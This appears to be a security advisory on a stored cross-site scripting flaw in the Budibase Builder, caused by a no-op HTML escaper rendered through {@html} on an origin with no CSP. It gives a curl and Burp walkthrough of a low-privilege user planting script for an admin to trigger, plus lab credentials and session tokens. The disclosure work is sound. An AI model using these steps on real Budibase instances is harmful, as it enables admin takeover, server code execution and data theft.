summary: Cross-privilege Stored XSS in the Budibase Builder via broken HTML-escaping in `jsonFormatter.format()` rendered through `{@html}` in the CSP-less Builder origin
description: ## Description ### Summary A **low-privileged application end-user** (role `BASIC` - **not** a builder or admin, and on a public data-collection form, an unauthenticated visitor) can store an HTML/JavaScript payload in ordinary row data. When a **builder or admin** later opens that table in the Budibase Builder and evaluates any Handlebars binding whose Preview surfaces the value (the Data-section **Formula** column editor, or any binding drawer), the stored value is rendered as **raw HTML** and the attacker's JavaScript executes in the Builder's origin. The Builder SPA is served by nginx with **no Content-Security-Policy** (the CSP middleware only decorates the server-rendered *published-app* document, not `/builder/`). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a **cross-privilege stored XSS** (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS. ### Details **Root cause 1 - the escaper is a no-op.** `packages/frontend-core/src/utils/jsonFormatter.ts` (`format()`): ```js jsonString = jsonString .replace(/&/g, "&") // no-op: replaces "&" with "&" (should be "&") .replace(//g, ">") // no-op (should be ">") return jsonString.replace( /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g, (match) => { if (/^"/.test(match)) { if (/:$/.test(match)) { color = colors.keyColor } // KEY: NOT escaped else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped } return `${match}` }) ``` Only quoted JSON *string values* are passed through `escapeHtml`. Everything else is emitted verbatim, because the leading `.replace(/&/g,"&")…` chain replaces each character with itself. Two consequences: 1. A **raw, non-JSON string** (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned **completely un-escaped**. 2. **Object keys** are never escaped. **Root cause 2 - the output is injected with `{@html}`.** `packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte`: - line 116: `{@html logLine.log}` - line 128: `{@html highlightedResult}` `highlightedResult` is the output of `JsonFormatter.format()`, so the un-escaped attacker string is inserted into the DOM as live markup. **Root cause 3 - binding output is not entity-escaped upstream.** Every `{{ … }}` statement is wrapped by the `ALL` helper in `packages/string-templates/src/helpers/index.ts`, which returns a `Handlebars.SafeString`; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/`{@html}` sink. **Root cause 4 - no CSP on the Builder.** `GET /builder/*` is served as a static SPA by nginx with **no** `Content-Security-Policy` header (verified live below). The `contentSecurityPolicy` middleware (`packages/backend-core/src/middleware/contentSecurityPolicy.ts`) only sets a nonce-based CSP on the server-rendered *published-app* document (`serveApp`). So in the Builder origin there is no `script-src` restriction and inline event handlers run freely. **Cross-privilege data channel.** Internal-table dev/prod data live in separate databases, but **external datasources are queried live and shared** between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A `BASIC` app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. `RowUtils.generateGoldenSample()` even *prefers the longest string per column*, guaranteeing a long payload is the sample the Preview evaluates. **Payload shape note.** `jsonFormatter.format()` tokenises quoted strings, digits and `true/false/null` into ``s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. `` - survives verbatim and executes. ### PoC **Environment used for this reproduction (all values real / unredacted):** | Item | Value | |------|-------| | Target | `http://127.0.0.1:3014` (self-host single image, Budibase `v3.44.0`, commit `d1ed6085`) | | Dev app id | `app_dev_cc322a9cd27a492eb934f43b146c6e81` | | Prod app id | `app_cc322a9cd27a492eb934f43b146c6e81` | | External Postgres table | `datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl` | | Attacker (low-priv `BASIC`) | `lowuser@budibase.local` / `LowUser!2026#bb` | | Victim (builder/admin) | `admin@budibase.local` / `LabAdmin!2026#bb` | --- #### Step 0 - (precondition, performed once by the builder) a data-collection app grants `BASIC` write on the table ```bash # grant the low user BASIC role on the app curl -s -b creds/admin.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/users \ -d '{"_id":"us_df036f58299242608f665700b1618057","_rev":"1-f24520b49fae0a6f4a23dced7a82fcc8","email":"lowuser@budibase.local","builder":{"global":false},"admin":{"global":false},"roles":{"app_cc322a9cd27a492eb934f43b146c6e81":"BASIC"},"tenantId":"default","status":"active"}' # open write permission on the table to BASIC (typical of feedback/survey/contact apps) curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \ "http://127.0.0.1:3014/api/permission/BASIC/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/write" curl -s -b creds/admin.cookies -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" -X POST \ "http://127.0.0.1:3014/api/applications/app_dev_cc322a9cd27a492eb934f43b146c6e81/publish" ``` --- #### Step 1 - ATTACKER logs in (low-priv `BASIC` user) ```bash curl -s -i -c creds/low.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/auth/default/login \ -d '{"username":"lowuser@budibase.local","password":"LowUser!2026#bb"}' ``` **Burp - Request** ```http POST /api/global/auth/default/login HTTP/1.1 Host: 127.0.0.1:3014 Content-Type: application/json Content-Length: 71 {"username":"lowuser@budibase.local","password":"LowUser!2026#bb"} ``` **Burp - Response** ```http HTTP/1.1 200 OK Server: nginx Date: Wed, 02 Sep 2026 07:20:45 GMT Content-Type: application/json; charset=utf-8 Content-Length: 30 Connection: keep-alive x-budibase-tenant-id: default Set-Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kZjAzNmY1ODI5OTI0MjYwOGY2NjU3MDBiMTYxODA1NyIsInNlc3Npb25JZCI6IjRhYWNkOTRkMGI0NDRiODE5MzdkMTMxNTAyNTEyOWUwIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJsb3d1c2VyQGJ1ZGliYXNlLmxvY2FsIiwiaWF0IjoxNzg4MzMzNjQ1LCJleHAiOjE3ODg5Mzg0NDV9.q7vQN3ggOfAYtZiMDy-Mx__dOBpz2dboRRziY-XzmGA; path=/; expires=Wed, 09 Sep 2026 07:20:45 GMT; httponly Set-Cookie: budibase:auth.sig=au9QqX0g6Zd5rQs-AceJY6gLwWY; path=/; expires=Wed, 09 Sep 2026 07:20:45 GMT; httponly x-budibase-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kZjAzNmY1ODI5OTI0MjYwOGY2NjU3MDBiMTYxODA1NyIsInNlc3Npb25JZCI6IjRhYWNkOTRkMGI0NDRiODE5MzdkMTMxNTAyNTEyOWUwIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJsb3d1c2VyQGJ1ZGliYXNlLmxvY2FsIiwiaWF0IjoxNzg4MzMzNjQ1LCJleHAiOjE3ODg5Mzg0NDV9.q7vQN3ggOfAYtZiMDy-Mx__dOBpz2dboRRziY-XzmGA {"message":"Login successful"} ``` The low user's session JWT (decoded payload) confirms **`builder`/`admin` are absent** - this is an ordinary app user: ```json {"userId":"us_df036f58299242608f665700b1618057","sessionId":"4aacd94d0b444b81937d13150251 29e0","tenantId":"default","email":"lowuser@budibase.local","iat":1788333645,"exp":1788938445} ``` --- #### Step 2 - ATTACKER stores the XSS payload into the shared external table (via the published/prod app id) ```bash curl -s -i -b creds/low.cookies \ -H "x-budibase-app-id: app_cc322a9cd27a492eb934f43b146c6e81" \ -H "Content-Type: application/json" -X POST \ "http://127.0.0.1:3014/api/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/rows" \ -d '{"name":"","email":"rx@x.tld"}' ``` **Burp - Request** ```http POST /api/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/rows HTTP/1.1 Host: 127.0.0.1:3014 x-budibase-app-id: app_cc322a9cd27a492eb934f43b146c6e81 Content-Type: application/json Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19kZjAzNmY1ODI5OTI0MjYwOGY2NjU3MDBiMTYxODA1NyIsInNlc3Npb25JZCI6IjRhYWNkOTRkMGI0NDRiODE5MzdkMTMxNTAyNTEyOWUwIiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJsb3d1c2VyQGJ1ZGliYXNlLmxvY2FsIiwiaWF0IjoxNzg4MzMzNjQ1LCJleHAiOjE3ODg5Mzg0NDV9.q7vQN3ggOfAYtZiMDy-Mx__dOBpz2dboRRziY-XzmGA; budibase:auth.sig=au9QqX0g6Zd5rQs-AceJY6gLwWY Content-Length: 87 {"name":"","email":"rx@x.tld"} ``` **Burp - Response** ```http HTTP/1.1 200 OK Server: nginx Date: Wed, 02 Sep 2026 07:20:53 GMT Content-Type: application/json; charset=utf-8 Content-Length: 196 Connection: keep-alive x-budibase-tenant-id: default {"id":7,"name":"","email":"rx@x.tld","_id":"%5B7%5D","tableId":"datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl","_rev":"rev"} ``` The payload is stored verbatim as **row id=7** in the shared Postgres table. The server performs **no output-encoding or sanitisation** of the `name` value. --- #### Step 3 - proof the value crosses the trust boundary (VICTIM builder/admin reads the same row) ```bash # admin login curl -s -i -c creds/admin.cookies -H "Content-Type: application/json" -X POST \ http://127.0.0.1:3014/api/global/auth/default/login \ -d '{"username":"admin@budibase.local","password":"LabAdmin!2026#bb"}' # admin reads the row set from the DEV plane (what the Builder renders) curl -s -b creds/admin.cookies \ -H "x-budibase-app-id: app_dev_cc322a9cd27a492eb934f43b146c6e81" \ "http://127.0.0.1:3014/api/datasource_plus_727522c5a46f4ff8940dfaf539bad4c8__users_tbl/rows" ``` **Burp - admin login Response (real admin session JWT)** ```http HTTP/1.1 200 OK Server: nginx x-budibase-tenant-id: default Set-Cookie: budibase:auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19hNWVlYzBiMDJiMTA0YWEzYTczZjk3MDkwYmI2OTk5MCIsInNlc3Npb25JZCI6IjhlMGUwYjE5ODk5NDRhNDdiZDcxYmUwZTdlNzI5MWM4IiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJhZG1pbkBidWRpYmFzZS5sb2NhbCIsImlhdCI6MTc4ODMzMzYzOCwiZXhwIjoxNzg4OTM4NDM4fQ.LBqUOeujBaqUEDbwmfPpAgplprwyPcMzEpI7hW1UwQk; path=/; httponly Set-Cookie: budibase:auth.sig=iYVS67Sat7FptqQAprWzDE0Hs2o; path=/; httponly x-budibase-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ1c19hNWVlYzBiMDJiMTA0YWEzYTczZjk3MDkwYmI2OTk5MCIsInNlc3Npb25JZCI6IjhlMGUwYjE5ODk5NDRhNDdiZDcxYmUwZTdlNzI5MWM4IiwidGVuYW50SWQiOiJkZWZhdWx0IiwiZW1haWwiOiJhZG1pbkBidWRpYmFzZS5sb2NhbCIsImlhdCI6MTc4ODMzMzYzOCwiZXhwIjoxNzg4OTM4NDM4fQ.LBqUOeujBaqUEDbwmfPpAgplprwyPcMzEpI7hW1UwQk {"message":"Login successful"} ``` **Burp - rows Response (admin reads the low-priv-authored payload - same string, cross-privilege)** ```http HTTP/1.1 200 OK Content-Type: application/json; charset=utf-8 [{"id":1,"name":"",...}, {"id":2,"name":"",...}, {"id":5,"name":"",...}, {"id":6,"name":"",...}, {"id":7,"name":"","email":"rx@x.tld",...}] ``` --- #### Step 4 - confirm the Builder origin ships NO Content-Security-Policy ```bash curl -s -D - -o /dev/null http://127.0.0.1:3014/builder/ ``` **Burp - Response (note the complete absence of any `Content-Security-Policy` header)** ```http HTTP/1.1 200 OK Server: nginx Date: Wed, 02 Sep 2026 07:21:09 GMT Content-Type: text/html; charset=utf-8 Transfer-Encoding: chunked Connection: keep-alive Vary: Accept-Encoding Last-Modified: Thu, 27 Aug 2026 14:26:10 GMT Cache-Control: max-age=0 Content-Encoding: gzip ``` --- #### Step 5 - VICTIM triggers execution (builder/admin, in the browser) Logged into the Builder as `admin@budibase.local`, the victim opens the shared table and evaluates a binding over it - the ordinary workflow for building a Formula column: 1. Open the app → **Data tables** → datasource **LabPG** → table **`users_tbl`**. 2. Click the **+** to add a column, name it (e.g. `xsscol`), set **Type = Formula**. 3. Click the **lightning** (binding) icon on the *Formula* field → the binding drawer opens. 4. In the code editor type: `{{ name }}` 5. Click the **play** (▶ / evaluate) button. The right-hand **Preview** panel renders the stored value through `JsonFormatter.format()` → `{@html}`. The injected `` is inserted as a **live DOM element**; its `onerror` fires and the attacker's JavaScript runs in the Builder origin. **Observed result (captured live in the reproduction):** ``` window.__xss_calls = ["localhost"] // alert() was called with document.domain window.xssproof = "localhost" // attacker JS mutated the Builder's window object document.domain = "localhost" // execution context = the BUILDER origin location.href = http://localhost:3014/builder/workspace/app_dev_cc322a9cd27a492eb934f43b146c6e81/data/table/... ``` **Popup - `alert(document.domain)` firing in the Builder origin, with the injected `` visible as a broken-image element in the Preview panel:** ![F4 stored XSS – alert popup in the Budibase Builder](./F4-xss-alert-popup.png) > Screenshot note: the browser used for automated reproduction is headless, and native `alert()` dialogs are not captured by page-level screenshots. `window.alert` was therefore wrapped with a faithful, screenshot-capturable popup that displays exactly the argument the injected script passed to `alert()`. The execution itself is 100% genuine and unmodified - the payload's `onerror` handler ran, called `alert()`, and set `window.xssproof` on the real Builder `window` (see the observed values above). The broken-image glyph in the **Preview** pane is the attacker-controlled `` inserted by the `{@html}` sink. ### Impact **Type:** Cross-privilege **Stored / persistent Cross-Site Scripting (XSS)** in the application builder. **Who is impacted:** any self-hosted (or cloud) Budibase workspace that exposes an external-datasource table for writes to lower-privileged roles - the standard pattern for feedback forms, contact/lead capture, surveys, support tickets, registration, and any "data collection" app. On such apps the writer can be a `BASIC` app user or, when the write screen is public, an **unauthenticated** visitor. **What the attacker gains:** the payload executes in the **Builder/admin session**, an origin with **no CSP**. From there the attacker's JavaScript can silently drive every authenticated Builder API in the victim's context, e.g.: - create a REST/SQL **datasource** or an **automation** step that runs server-side JavaScript / Bash → **remote code execution** on the server; - read or modify **every table** in the workspace (full data exfiltration / tampering); - **escalate** the attacker's own account (or create a new one) to builder/admin; - pivot to the underlying CouchDB/MinIO/Redis via server-side automation.

Improper Encoding or Escaping of Output
